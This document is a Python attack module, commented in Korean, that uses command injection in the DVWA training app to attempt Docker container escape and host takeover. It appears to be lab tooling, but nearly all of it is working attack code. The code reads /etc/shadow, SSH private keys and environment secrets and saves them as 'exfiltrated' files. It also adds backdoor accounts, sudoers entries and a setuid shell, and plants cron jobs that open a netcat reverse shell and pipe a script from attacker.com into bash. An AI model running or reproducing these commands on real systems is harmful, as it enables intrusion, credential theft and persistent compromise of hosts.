"""
Docker Container Escape Module
Docker 컨테이너 탈출 및 호스트 시스템 권한 획득 모듈
"""

import time
import re
import os
import json
from datetime import datetime
from utils.logger import log_attack, log_command_output, log_exfiltrated_data

# Docker 탈출 벡터 확인
DOCKER_ESCAPE_CHECKS = {
    'container_detection': [
        # Docker 컨테이너인지 확인
        'cat /proc/1/cgroup | grep docker',
        'ls -la /.dockerenv',
        'cat /proc/self/mountinfo | grep docker',
    ],
    'docker_socket': [
        # Docker 소켓 접근 가능 여부 (매우 위험!)
        'ls -la /var/run/docker.sock',
        'test -S /var/run/docker.sock && echo "SOCKET_ACCESSIBLE"',
    ],
    'privileged_container': [
        # Privileged 모드 확인
        'cat /proc/self/status | grep CapEff',
        'capsh --print | grep Current',
        'fdisk -l 2>/dev/null | head -20',
    ],
    'host_filesystem': [
        # 호스트 파일시스템 마운트 확인
        'mount | grep /host',
        'mount | grep /proc/sys',
        'df -h | grep /host',
    ],
    'namespace_escape': [
        # Namespace 탈출 가능성 확인
        'cat /proc/self/status | grep NSpid',
        'ls -la /proc/1/ns/',
    ],
}

# Docker 탈출 기법
DOCKER_ESCAPE_TECHNIQUES = [
    {
        'name': 'Docker Socket Exploitation',
        'description': 'Docker 소켓을 통한 컨테이너 생성 및 호스트 접근',
        'check_command': 'test -S /var/run/docker.sock && echo "YES"',
        'exploit_commands': [
            # Docker 클라이언트 설치 확인
            'which docker',
            # 호스트 루트를 마운트한 특권 컨테이너 생성
            'docker run -v /:/host -it alpine chroot /host /bin/bash -c "cat /etc/shadow"',
            'docker run -v /:/host -it alpine chroot /host /bin/bash -c "cat /root/.ssh/id_rsa"',
        ],
    },
    {
        'name': 'Privileged Container Breakout',
        'description': 'Privileged 모드 컨테이너에서 호스트 접근',
        'check_command': 'fdisk -l 2>/dev/null | grep -q /dev/ && echo "YES"',
        'exploit_commands': [
            # 호스트 디스크 마운트 시도
            'mkdir -p /tmp/hostfs 2>/dev/null',
            'mount /dev/sda1 /tmp/hostfs 2>/dev/null && echo "MOUNTED"',
            'ls -la /tmp/hostfs/root 2>/dev/null',
            'cat /tmp/hostfs/etc/shadow 2>/dev/null | head -5',
        ],
    },
    {
        'name': 'Exposed Docker API',
        'description': 'Docker API를 통한 원격 명령 실행',
        'check_command': 'curl -s --unix-socket /var/run/docker.sock http://localhost/version 2>/dev/null | grep -q ApiVersion && echo "YES"',
        'exploit_commands': [
            'curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json',
            'curl -s --unix-socket /var/run/docker.sock http://localhost/images/json',
        ],
    },
    {
        'name': 'Host Filesystem Access',
        'description': '마운트된 호스트 파일시스템을 통한 접근',
        'check_command': 'mount | grep -q "/host" && echo "YES"',
        'exploit_commands': [
            'ls -la /host',
            'cat /host/etc/shadow 2>/dev/null | head -5',
            'cat /host/root/.ssh/id_rsa 2>/dev/null',
        ],
    },
    {
        'name': 'Procfs Host Access',
        'description': '/proc을 통한 호스트 프로세스 정보 접근',
        'check_command': 'test -d /proc && echo "YES"',
        'exploit_commands': [
            # 호스트 프로세스 확인
            'ps aux | head -20',
            # 호스트 환경 변수 탈취
            'cat /proc/1/environ | tr "\\0" "\\n" | head -30',
            # 호스트 cmdline 확인
            'cat /proc/1/cmdline',
            # 호스트 마운트 정보
            'cat /proc/mounts | grep -v docker | head -20',
        ],
    },
    {
        'name': 'Cgroup Escape',
        'description': 'Cgroup을 통한 호스트 명령 실행',
        'check_command': 'test -w /sys/fs/cgroup 2>/dev/null && echo "YES" || test -r /sys/fs/cgroup && echo "YES"',
        'exploit_commands': [
            # cgroup 정보 확인
            'cat /proc/self/cgroup | head -10',
            'ls -la /sys/fs/cgroup/ 2>/dev/null',
            # cgroup 마운트 확인
            'mount | grep cgroup',
        ],
    },
    {
        'name': 'Container Capabilities Abuse',
        'description': '컨테이너 Capabilities를 악용한 권한 상승',
        'check_command': 'capsh --print 2>/dev/null | grep -q Current && echo "YES" || cat /proc/self/status | grep -q Cap && echo "YES"',
        'exploit_commands': [
            # 현재 Capabilities 확인
            'cat /proc/self/status | grep Cap',
            'capsh --print 2>/dev/null',
            # 파일 Capabilities 확인
            'getcap -r / 2>/dev/null | head -20',
        ],
    },
    {
        'name': 'Release Agent Exploit',
        'description': 'cgroup release_agent를 통한 호스트 명령 실행',
        'check_command': 'test -f /sys/fs/cgroup/memory/release_agent 2>/dev/null && echo "YES" || test -f /sys/fs/cgroup/release_agent 2>/dev/null && echo "YES"',
        'exploit_commands': [
            # release_agent 경로 확인
            'cat /sys/fs/cgroup/release_agent 2>/dev/null',
            'cat /sys/fs/cgroup/*/release_agent 2>/dev/null | head -5',
            # notify_on_release 확인
            'find /sys/fs/cgroup -name notify_on_release 2>/dev/null | head -10',
        ],
    },
    {
        'name': 'Kernel Exploit',
        'description': '커널 취약점을 통한 컨테이너 탈출',
        'check_command': 'uname -a | grep -q Linux && echo "YES"',
        'exploit_commands': [
            # 커널 버전 상세 정보
            'uname -a',
            'cat /proc/version',
            # 알려진 취약한 커널 버전 확인
            'uname -r',
            # 커널 모듈 확인
            'lsmod 2>/dev/null | head -20',
        ],
    },
    {
        'name': 'Volume Mount Exploitation',
        'description': '마운트된 볼륨을 통한 호스트 접근',
        'check_command': 'mount | grep -v "docker\\|overlay\\|shm" | grep -q "/" && echo "YES"',
        'exploit_commands': [
            # 모든 마운트 확인
            'mount | grep -v "docker\\|overlay\\|shm"',
            # 쓰기 가능한 마운트 찾기
            'df -h | grep -v "overlay\\|tmpfs\\|shm"',
            # 의심스러운 마운트 탐색
            'cat /proc/mounts | grep -v "docker\\|overlay" | head -20',
        ],
    },
    {
        'name': 'Environment Variable Leak',
        'description': '환경 변수를 통한 민감 정보 탈취',
        'check_command': 'env | grep -q . && echo "YES"',
        'exploit_commands': [
            # 모든 환경 변수 덤프
            'env',
            # 민감 정보 패턴 검색
            'env | grep -i "key\\|pass\\|secret\\|token\\|credential"',
            # 부모 프로세스 환경 변수
            'cat /proc/1/environ | tr "\\0" "\\n"',
        ],
    },
    {
        'name': 'Network Namespace Escape',
        'description': '네트워크 네임스페이스를 통한 호스트 네트워크 접근',
        'check_command': 'ip addr 2>/dev/null | grep -q inet && echo "YES" || ifconfig 2>/dev/null | grep -q inet && echo "YES"',
        'exploit_commands': [
            # 네트워크 인터페이스 확인
            'ip addr 2>/dev/null || ifconfig 2>/dev/null',
            # 라우팅 테이블
            'ip route 2>/dev/null || route -n 2>/dev/null',
            # ARP 테이블 (호스트 네트워크 정보)
            'ip neigh 2>/dev/null || arp -a 2>/dev/null',
            # 네트워크 연결
            'netstat -tun 2>/dev/null | head -20',
        ],
    },
]

def run_attack(session, delay=1):
    """
    Docker 컨테이너 탈출 공격 실행

    Args:
        session: DVWA 세션 객체
        delay: 요청 간 지연 시간(초)

    Returns:
        dict: 공격 결과 통계
    """
    results = {
        'success': False,
        'attempts': 0,
        'successful': 0,
        'findings': {
            'is_container': False,
            'escape_vectors': {},
            'escaped': False,
            'host_access': [],
            'root_access': False
        }
    }

    print("\n  [*] ===========================================")
    print("  [*] Docker 컨테이너 탈출 및 호스트 권한 획득")
    print("  [*] ===========================================\n")

    cmdi_url = f"{session.base_url}/vulnerabilities/exec/"

    # 1단계: Docker 컨테이너 확인
    print("  [1/4] Docker 컨테이너 여부 확인 중...")
    if not check_docker_container(session, cmdi_url, results, delay):
        print("    [-] Docker 컨테이너가 아닙니다. 탈출 불가능")
        return results

    print("    [!] Docker 컨테이너 감지! 탈출 시도 시작...")
    results['findings']['is_container'] = True

    # 2단계: 탈출 벡터 스캔
    print("\n  [2/4] Docker 탈출 벡터 스캔 중...")
    scan_escape_vectors(session, cmdi_url, results, delay)

    # 3단계: 실제 탈출 시도
    print("\n  [3/4] Docker 탈출 시도 중...")
    attempt_container_escape(session, cmdi_url, results, delay)

    # 4단계: 호스트 루트 권한 획득 시도
    if results['findings']['host_access']:
        attempt_host_root_access(session, cmdi_url, results, delay)

    if results['successful'] > 0:
        results['success'] = True

    print_docker_escape_summary(results)
    return results

def check_docker_container(session, cmdi_url, results, delay):
    """Docker 컨테이너 여부 확인"""

    check_commands = [
        'cat /proc/1/cgroup | grep docker',
        'ls -la /.dockerenv',
    ]

    for cmd in check_commands:
        results['attempts'] += 1

        try:
            payload = f"127.0.0.1; {cmd}"
            data = {'ip': payload, 'Submit': 'Submit'}
            response = session.session.post(cmdi_url, data=data)
            output = extract_command_output(response.text)

            if output and len(output) > 5:
                results['successful'] += 1
                log_attack(
                    'DOCKER_DETECTION',
                    'SUCCESS',
                    f"Container detected: {cmd}",
                    response.status_code,
                    len(response.text)
                )
                return True

            time.sleep(delay)

        except Exception as e:
            log_attack('DOCKER_DETECTION', 'ERROR', f"Error: {str(e)}", 0, 0)

    return False

def scan_escape_vectors(session, cmdi_url, results, delay):
    """Docker 탈출 벡터 스캔"""

    for category, commands in DOCKER_ESCAPE_CHECKS.items():
        print(f"    [*] {category} 확인 중...")
        category_findings = []

        for cmd in commands:
            results['attempts'] += 1

            try:
                payload = f"127.0.0.1; {cmd}"
                data = {'ip': payload, 'Submit': 'Submit'}
                response = session.session.post(cmdi_url, data=data)
                output = extract_command_output(response.text)

                if output and len(output) > 5:
                    results['successful'] += 1
                    category_findings.append({
                        'command': cmd,
                        'output': output
                    })

                    # 데이터를 파일로 저장
                    saved_file = save_exfiltrated_data(category, cmd, output, results)

                    log_command_output(cmd, category, output, preview_lines=20)
                    log_attack(
                        'DOCKER_ESCAPE_VECTOR',
                        'SUCCESS',
                        f"Category: {category}, Command: {cmd}",
                        response.status_code,
                        len(response.text)
                    )

                    # 중요 발견 사항 표시
                    if 'SOCKET_ACCESSIBLE' in output:
                        print(f"      [!!!] Docker 소켓 접근 가능! (매우 위험)")
                    elif 'docker' in output.lower():
                        print(f"      [+] Docker 환경 확인: {output[:50]}...")
                    elif '/dev/sd' in output or '/dev/xvd' in output:
                        print(f"      [!] 호스트 디스크 접근 가능!")
                    elif '/host' in output:
                        print(f"      [!] 호스트 파일시스템 마운트됨!")
                    else:
                        print(f"      [+] {cmd[:60]}")
                    print(f"      [📁] 저장됨: {saved_file}")

                time.sleep(delay)

            except Exception as e:
                log_attack('DOCKER_ESCAPE_VECTOR', 'ERROR', f"Command: {cmd}, Error: {str(e)}", 0, 0)

        if category_findings:
            results['findings']['escape_vectors'][category] = category_findings

def attempt_container_escape(session, cmdi_url, results, delay):
    """Docker 컨테이너 탈출 시도"""

    for technique in DOCKER_ESCAPE_TECHNIQUES:
        results['attempts'] += 1

        try:
            print(f"\n    [*] {technique['name']} 시도 중...")
            print(f"        {technique['description']}")

            # 탈출 기법 적용 가능 여부 확인
            check_payload = f"127.0.0.1; {technique['check_command']}"
            check_data = {'ip': check_payload, 'Submit': 'Submit'}
            check_response = session.session.post(cmdi_url, data=check_data)
            check_output = extract_command_output(check_response.text)

            if 'YES' not in check_output and 'MOUNTED' not in check_output:
                print(f"        [-] 이 기법은 적용 불가능")
                time.sleep(delay)
                continue

            print(f"        [+] 적용 가능! 탈출 시도 중...")
            results['successful'] += 1

            # 탈출 명령 실행
            for exploit_cmd in technique['exploit_commands']:
                results['attempts'] += 1

                payload = f"127.0.0.1; {exploit_cmd}"
                data = {'ip': payload, 'Submit': 'Submit'}
                response = session.session.post(cmdi_url, data=data)
                output = extract_command_output(response.text)

                if output and len(output) > 10:
                    results['successful'] += 1
                    results['findings']['host_access'].append({
                        'technique': technique['name'],
                        'command': exploit_cmd,
                        'output': output
                    })

                    # 데이터를 파일로 저장
                    saved_file = save_exfiltrated_data(technique['name'], exploit_cmd, output, results)

                    # 호스트 데이터 탈취 로그 기록
                    log_exfiltrated_data(
                        f"Docker Escape - {technique['name']}",
                        exploit_cmd,
                        output,
                        preview_length=1000
                    )

                    log_attack(
                        'DOCKER_ESCAPE_SUCCESS',
                        'SUCCESS',
                        f"Technique: {technique['name']}, Command: {exploit_cmd}",
                        response.status_code,
                        len(response.text)
                    )

                    # 민감한 데이터 발견 시 표시
                    if 'root:' in output or '$6$' in output:
                        print(f"        [!!!] 호스트 /etc/shadow 접근 성공! ({len(output)} bytes)")
                        print(f"        [📁] 저장됨: {saved_file}")
                        results['findings']['escaped'] = True
                    elif 'BEGIN RSA PRIVATE KEY' in output or 'BEGIN OPENSSH PRIVATE KEY' in output:
                        print(f"        [!!!] SSH 프라이빗 키 탈취 성공!")
                        print(f"        [📁] 저장됨: {saved_file}")
                        results['findings']['escaped'] = True
                    elif len(output) > 50:
                        print(f"        [+] 데이터 수집: {len(output)} bytes")
                        print(f"        [📁] 저장됨: {saved_file}")

                time.sleep(delay)

        except Exception as e:
            log_attack('DOCKER_ESCAPE_ATTEMPT', 'ERROR', f"Technique: {technique['name']}, Error: {str(e)}", 0, 0)

def save_exfiltrated_data(technique_name, command, output, results):
    """탈취한 데이터를 파일로 저장"""
    # 저장 디렉토리 생성
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    base_dir = f"exfiltrated_data/docker_escape_{timestamp}"
    os.makedirs(base_dir, exist_ok=True)

    # 파일명 생성 (특수문자 제거)
    safe_technique = re.sub(r'[^\w\s-]', '', technique_name).strip()
    safe_technique = re.sub(r'[-\s]+', '_', safe_technique)

    # 명령어에 따른 파일명 결정
    if 'shadow' in command:
        filename = f"{safe_technique}_etc_shadow.txt"
    elif 'id_rsa' in command:
        filename = f"{safe_technique}_ssh_keys.txt"
    elif 'environ' in command:
        filename = f"{safe_technique}_environment_vars.txt"
    elif 'uname' in command or 'version' in command:
        filename = f"{safe_technique}_kernel_info.txt"
    elif 'mount' in command:
        filename = f"{safe_technique}_mount_info.txt"
    elif 'cgroup' in command:
        filename = f"{safe_technique}_cgroup_info.txt"
    elif 'ps' in command:
        filename = f"{safe_technique}_processes.txt"
    elif 'ip' in command or 'ifconfig' in command:
        filename = f"{safe_technique}_network_info.txt"
    else:
        filename = f"{safe_technique}_output_{len(os.listdir(base_dir))}.txt"

    # 데이터 저장
    filepath = os.path.join(base_dir, filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(f"Technique: {technique_name}\n")
        f.write(f"Command: {command}\n")
        f.write(f"Timestamp: {datetime.now()}\n")
        f.write(f"{'='*80}\n\n")
        f.write(output)

    # 결과에 저장된 파일 경로 추가
    if 'saved_files' not in results:
        results['saved_files'] = []
    results['saved_files'].append(filepath)

    return filepath

def extract_command_output(html_response):
    """HTML 응답에서 명령어 출력 추출"""
    try:
        # <pre> 태그에서 추출
        pre_match = re.search(r'<pre>(.*?)</pre>', html_response, re.DOTALL | re.IGNORECASE)
        if pre_match:
            output = pre_match.group(1)
        else:
            textarea_match = re.search(r'<textarea[^>]*>(.*?)</textarea>', html_response, re.DOTALL | re.IGNORECASE)
            if textarea_match:
                output = textarea_match.group(1)
            else:
                return ""

        # HTML 엔티티 디코딩
        output = output.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&')
        output = output.replace('&quot;', '"').replace('&#039;', "'")

        # ping 결과 완전 제거
        lines = output.split('\n')
        filtered_lines = []
        in_ping_section = False

        for line in lines:
            if 'PING 127.0.0.1' in line:
                in_ping_section = True
                continue
            if in_ping_section:
                if 'bytes from 127.0.0.1' in line:
                    continue
                if '127.0.0.1 ping statistics' in line:
                    continue
                if 'packets transmitted' in line:
                    continue
                if 'round-trip' in line or 'rtt min' in line:
                    continue
                if line.startswith('---'):
                    continue
                if not line.strip():
                    continue
                in_ping_section = False
            if line.strip():
                filtered_lines.append(line)

        return '\n'.join(filtered_lines).strip()
    except Exception:
        return ""

def attempt_host_root_access(session, cmdi_url, results, delay):
    """탈출 후 호스트 루트 권한 획득 시도"""

    print("\n  [4/4] 호스트 루트 권한 획득 시도 중...")

    # 호스트 접근이 성공한 경우에만 실행
    if not results['findings']['host_access']:
        print("    [-] 호스트 접근 불가능, 루트 권한 시도 불가")
        return

    root_attempts = [
        {
            'name': 'chroot를 통한 호스트 쉘 획득',
            'commands': [
                'chroot /host /bin/bash -c "whoami"',
                'chroot /host /bin/bash -c "id"',
                'chroot /host /bin/bash -c "cat /etc/shadow | head -5"'
            ]
        },
        {
            'name': 'nsenter를 통한 호스트 네임스페이스 진입',
            'commands': [
                'nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash -c "whoami"',
                'nsenter -t 1 -m -u -i -n -p /bin/bash -c "id"',
                'nsenter -t 1 -m -u -i -n -p /bin/bash -c "cat /root/.ssh/authorized_keys 2>/dev/null"'
            ]
        },
        {
            'name': '호스트 파일시스템 직접 조작',
            'commands': [
                # SSH 키 추가
                'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@2sec" >> /host/root/.ssh/authorized_keys 2>/dev/null',
                # sudoers 수정
                'echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /host/etc/sudoers 2>/dev/null',
                # 백도어 계정 생성
                'chroot /host /bin/bash -c "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor 2>/dev/null"'
            ]
        },
        {
            'name': 'Cron을 통한 지속성 확보',
            'commands': [
                'echo "* * * * * root /bin/bash -c \"nc -e /bin/bash attacker.com 4444\" 2>/dev/null" >> /host/etc/crontab',
                'echo "* * * * * root curl http://attacker.com/shell.sh | bash" >> /host/var/spool/cron/crontabs/root 2>/dev/null',
                'chroot /host /bin/bash -c "service cron reload 2>/dev/null"'
            ]
        },
        {
            'name': 'SetUID 바이너리 생성',
            'commands': [
                'cp /bin/bash /host/tmp/rootshell 2>/dev/null',
                'chmod 4755 /host/tmp/rootshell 2>/dev/null',
                'ls -la /host/tmp/rootshell 2>/dev/null'
            ]
        }
    ]

    for attempt in root_attempts:
        print(f"\n    [*] {attempt['name']} 시도 중...")

        for cmd in attempt['commands']:
            results['attempts'] += 1

            try:
                payload = f"127.0.0.1; {cmd}"
                data = {'ip': payload, 'Submit': 'Submit'}
                response = session.session.post(cmdi_url, data=data)
                output = extract_command_output(response.text)

                if output and len(output) > 5:
                    results['successful'] += 1

                    # 데이터를 파일로 저장
                    saved_file = save_exfiltrated_data(f"Root Access - {attempt['name']}", cmd, output, results)

                    # 루트 권한 획득 성공 확인
                    if 'root' in output or 'uid=0' in output:
                        print(f"        [!!!] 루트 권한 획득 성공!")
                        print(f"        [📁] 저장됨: {saved_file}")
                        results['findings']['root_access'] = True
                        log_exfiltrated_data(
                            'ROOT_ACCESS',
                            cmd,
                            output,
                            preview_length=1000
                        )
                    elif 'authorized_keys' in cmd and 'ssh-rsa' in output:
                        print(f"        [!!!] SSH 백도어 설치 성공!")
                        print(f"        [📁] 저장됨: {saved_file}")
                    elif 'rootshell' in output and '4755' in output:
                        print(f"        [!!!] SetUID 루트쉘 생성 성공!")
                        print(f"        [📁] 저장됨: {saved_file}")
                    else:
                        print(f"        [+] 명령 실행: {len(output)} bytes")
                        print(f"        [📁] 저장됨: {saved_file}")

                    log_command_output(cmd, 'ROOT_ACCESS_ATTEMPT', output)

                time.sleep(delay)

            except Exception as e:
                log_attack('ROOT_ACCESS_ATTEMPT', 'ERROR', f"Command: {cmd}, Error: {str(e)}", 0, 0)

def print_docker_escape_summary(results):
    """Docker 탈출 결과 요약 출력"""
    print("\n  [*] ===========================================")
    print("  [*] Docker 컨테이너 탈출 결과 요약")
    print("  [*] ===========================================\n")

    print(f"  총 시도: {results['attempts']}회")
    print(f"  성공: {results['successful']}회\n")

    findings = results['findings']

    if findings['is_container']:
        print(f"  [+] Docker 컨테이너: 확인됨")

        if findings['escape_vectors']:
            print(f"\n  [+] 발견된 탈출 벡터:")
            for vector, data in findings['escape_vectors'].items():
                print(f"      - {vector}: {len(data)}개 발견")

        if findings['escaped'] or findings['host_access']:
            print(f"\n  {'='*60}")
            print(f"  [🔥🔥🔥] 탈출 성공! 호스트 시스템 접근 획득!")
            print(f"  {'='*60}")

            if findings.get('root_access'):
                print(f"\n  [💀💀💀] 호스트 루트 권한 획득!")
                print(f"  [💀💀💀] 시스템 완전 장악 성공!")
                print(f"\n  🎯 공격자가 할 수 있는 것:")
                print(f"     ✓ 모든 시스템 파일 읽기/쓰기")
                print(f"     ✓ 새로운 백도어 계정 생성")
                print(f"     ✓ SSH 키 설치로 영구 접근")
                print(f"     ✓ 시스템 로그 삭제 및 조작")
                print(f"     ✓ 다른 컨테이너 조작")
                print(f"     ✓ 호스트 네트워크 스니핑")
            else:
                print(f"\n  [🔓] 호스트 접근 성공! (제한된 권한)")
                print(f"  [⚠️] 루트 권한 획득 시도 중...")

            if 'saved_files' in results:
                print(f"\n  📁 수집된 데이터 저장 위치:")
                # 디렉토리만 표시
                dirs = set(os.path.dirname(f) for f in results['saved_files'])
                for d in dirs:
                    print(f"     {d}/")
                    file_count = len([f for f in results['saved_files'] if os.path.dirname(f) == d])
                    print(f"     └─ {file_count}개 파일 저장됨")

            print(f"\n  [💡] 추가 공격 제안:")
            print(f"     1. AWS 메타데이터 탈취: cloud-exploit")
            print(f"     2. OpenSearch/Kibana 접근: 수집된 설정 파일 확인")
            print(f"     3. 다른 서비스 크리덴셜 수집: 환경변수 및 설정 파일 분석")
            print(f"     4. 횡적 이동: 네트워크 정보로 다른 시스템 탐색")

        else:
            print(f"\n  [-] 컨테이너 탈출: 실패")
    else:
        print(f"  [-] Docker 컨테이너 아님")

    print()
